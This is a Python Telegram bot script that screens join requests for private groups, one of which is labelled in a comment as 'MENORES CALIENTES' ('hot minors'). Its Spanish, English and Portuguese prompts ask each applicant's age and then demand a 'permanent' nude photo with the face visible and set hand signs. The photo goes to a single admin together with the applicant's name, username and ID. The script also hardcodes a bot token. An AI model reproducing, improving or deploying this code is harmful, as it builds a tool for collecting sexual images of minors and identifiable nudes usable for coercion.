import os

from telegram import (
    Update,
    InlineKeyboardButton,
    InlineKeyboardMarkup,
)

from telegram.ext import (
    ApplicationBuilder,
    CommandHandler,
    MessageHandler,
    ChatJoinRequestHandler,
    CallbackQueryHandler,
    ContextTypes,
    filters,
)

TOKEN = "8797013447:AAHcfHxJC9H7RqfiegnUe2CMWCReUY32ozc"

pending_users = {}

GROUP_IDS = [
    -1003968636484,   # LOS COMUNES
    -1003936428271,   # MENORES CALIENTES
]

ADMIN_ID = 8011642705

TEXTS = {
    "es": {
        "welcome": (
            "🔒 Bienvenido al sistema de verificación de LOS COMUNES.\n\n"

            "Este proceso es obligatorio para ingresar al grupo.\n\n"

            "LA INFORMACIÓN ENVIADA SERÁ REVISADA MANUALMENTE POR UNA PERSONA.\n"
            "NO ENVIES INFORMACIÓN FALSA, NO ENGAÑARAS A NADIE.\n\n"

            "Las solicitudes inválidas serán rechazadas y el usuario podrá ser baneado de la federación de grupos.\n\n"

            "PARA COMENZAR DECÍ TU EDAD 👀"
        ),

        "ask_photo": (
            "Perfecto.\n\n"

            "Ahora enviá una FOTO DESNUDO permanente, parado CON CARA,\n"
            "haciendo estas señas con las manos:\n\n"

            "👌🤟"
        ),

        "invalid_photo": "Tenés que enviar una foto válida.",

        "sent": "✅ Solicitud enviada para revisión.",

        "approved": "✅ Tu solicitud fue aprobada.",

        "rejected": "❌ Tu solicitud fue rechazada.",
    },

    "en": {
        "welcome": (
            "🔒 Welcome to the LOS COMUNES verification system.\n\n"

            "This process is mandatory to join the group.\n\n"

            "THE SUBMITTED INFORMATION WILL BE MANUALLY REVIEWED BY A REAL PERSON.\n"
            "DO NO SEND FAKE INFORMATIOND,YOU WON'T DECEIVE ANYONE.\n\n"

            "Invalid requests will be rejected and the user may be banned from the federation of groups.\n\n"

            "TO BEGIN, TELL YOUR AGE 👀"
        ),

        "ask_photo": (
            "Perfect.\n\n"

            "Now send a permanent NAKED PHOTO standing up WITH your FACE visible,\n"
            "doing these hand signs:\n\n"

            "👌🤟"
        ),

        "invalid_photo": "You must send a valid photo.",

        "sent": "✅ Request sent for review.",

        "approved": "✅ Your request was approved.",

        "rejected": "❌ Your request was rejected.",
    },

    "pt": {
        "welcome": (
            "🔒 Bem-vindo ao sistema de verificação do LOS COMUNES.\n\n"

            "Este processo é obrigatório para entrar no grupo.\n\n"

            "AS INFORMAÇÕES SERÃO REVISADAS MANUALMENTE POR UNA PESSOA REAL.\n"
            "NÃO ENVIE INFORMAÇÕES FALSAS, VOCÊ NÃO ENGANARÁ NINGUÉM.\n\n"

            "Solicitações inválidas serão rejeitadas e o usuário poderá ser banido da federação de grupos.\n\n"

            "PARA COMEÇAR, DIGA SUA IDADE 👀"
        ),

        "ask_photo": (
            "Perfeito.\n\n"

            "Agora envie uma FOTO NUO permanente em pé, COM o ROSTO visível,\n"
            "fazendo estes sinais com as mãos:\n\n"

            "👌🤟"
        ),

        "invalid_photo": "Você precisa enviar uma foto válida.",

        "sent": "✅ Solicitação enviada para revisão.",

        "approved": "✅ Sua solicitação foi aprovada.",

        "rejected": "❌ Sua solicitação foi rejeitada.",
    }
}


async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):

    keyboard = [
        [
            InlineKeyboardButton("Español", callback_data="lang_es"),
            InlineKeyboardButton("English", callback_data="lang_en"),
            InlineKeyboardButton("Português", callback_data="lang_pt"),
        ]
    ]

    reply_markup = InlineKeyboardMarkup(keyboard)

    await update.message.reply_text(
        "Seleccioná tu idioma / Select your language / Selecione seu idioma",
        reply_markup=reply_markup
    )


async def language_selected(update: Update, context: ContextTypes.DEFAULT_TYPE):

    query = update.callback_query

    await query.answer()

    lang = query.data.split("_")[1]

    user = query.from_user

    if user.id not in pending_users:
        pending_users[user.id] = {}

    pending_users[user.id]["step"] = "age"
    pending_users[user.id]["lang"] = lang
    pending_users[user.id]["username"] = user.username
    pending_users[user.id]["name"] = user.full_name

    await query.edit_message_text(
        TEXTS[lang]["welcome"]
    )


async def join_request(update: Update, context: ContextTypes.DEFAULT_TYPE):

    user = update.chat_join_request.from_user
    group_id = update.chat_join_request.chat.id

    # Ignorar grupos no autorizados
    if group_id not in GROUP_IDS:
        return

    pending_users[user.id] = {
        "group_id": group_id
    }

    keyboard = [
        [
            InlineKeyboardButton("Español", callback_data="lang_es"),
            InlineKeyboardButton("English", callback_data="lang_en"),
            InlineKeyboardButton("Português", callback_data="lang_pt"),
        ]
    ]

    reply_markup = InlineKeyboardMarkup(keyboard)

    try:

        await context.bot.send_message(
            chat_id=user.id,
            text=(
                "🔒 LOS COMUNES Verification Bot\n\n"

                "Este bot realiza la verificación obligatoria para ingresar al grupo.\n\n"

                "This bot performs the mandatory verification required to join the group.\n\n"

                "Este bot realiza a verificação obrigatória para entrar no grupo.\n\n"

                "Seleccioná tu idioma para continuar.\n"
                "Select your language to continue.\n"
                "Selecione seu idioma para continuar."
            ),
            reply_markup=reply_markup
        )

    except Exception as e:
        print(f"No se pudo enviar mensaje: {e}")


async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):

    # Ignorar mensajes fuera del privado
    if update.effective_chat.type != "private":
        return

    user_id = update.effective_user.id

    if user_id not in pending_users:
        return

    step = pending_users[user_id].get("step")
    lang = pending_users[user_id].get("lang", "es")

    # PEDIR EDAD
    if step == "age":

        if not update.message.text:

            await update.message.reply_text(
                "Please send only your age in numbers."
            )
            return

        if not update.message.text.isdigit():

            await update.message.reply_text(
                "Please send only your age in numbers."
            )
            return

        pending_users[user_id]["age"] = update.message.text
        pending_users[user_id]["step"] = "photo"

        await update.message.reply_text(
            TEXTS[lang]["ask_photo"]
        )

    # PEDIR FOTO
    elif step == "photo":

        if update.message.photo:

            age = pending_users[user_id]["age"]

            username = pending_users[user_id].get("username")
            name = pending_users[user_id].get("name")

            username_text = (
                f"@{username}"
                if username else "Sin @username"
            )

            await context.bot.send_photo(
                chat_id=ADMIN_ID,
                photo=update.message.photo[-1].file_id,
                caption=(
                    f"📥 Solicitud nueva\n\n"

                    f"👤 Nombre: {name}\n"
                    f"🔗 Usuario: {username_text}\n"
                    f"🆔 ID: {user_id}\n"
                    f"🎂 Edad: {age}\n\n"

                    f"/aprobar {user_id}\n"
                    f"/rechazar {user_id}"
                )
            )

            await update.message.reply_text(
                TEXTS[lang]["sent"]
            )

            pending_users[user_id]["step"] = "done"

        else:

            await update.message.reply_text(
                TEXTS[lang]["invalid_photo"]
            )


async def aprobar(update: Update, context: ContextTypes.DEFAULT_TYPE):

    if update.effective_user.id != ADMIN_ID:
        return

    user_id = int(context.args[0])

    group_id = pending_users[user_id]["group_id"]

    await context.bot.approve_chat_join_request(
        chat_id=group_id,
        user_id=user_id
    )

    await context.bot.send_message(
        user_id,
        "✅ Approved."
    )

    await update.message.reply_text(
        "Usuario aprobado."
    )


async def rechazar(update: Update, context: ContextTypes.DEFAULT_TYPE):

    if update.effective_user.id != ADMIN_ID:
        return

    user_id = int(context.args[0])

    group_id = pending_users[user_id]["group_id"]

    await context.bot.decline_chat_join_request(
        chat_id=group_id,
        user_id=user_id
    )

    await context.bot.send_message(
        user_id,
        "❌ Rejected."
    )

    await update.message.reply_text(
        "Usuario rechazado."
    )


app = ApplicationBuilder().token(TOKEN).build()

app.add_handler(CommandHandler("start", start))

app.add_handler(CallbackQueryHandler(language_selected))

app.add_handler(ChatJoinRequestHandler(join_request))

app.add_handler(
    MessageHandler(
        ~filters.COMMAND,
        handle_message
    )
)

app.add_handler(CommandHandler("aprobar", aprobar))
app.add_handler(CommandHandler("rechazar", rechazar))

print("Bot iniciado...")

app.run_polling()
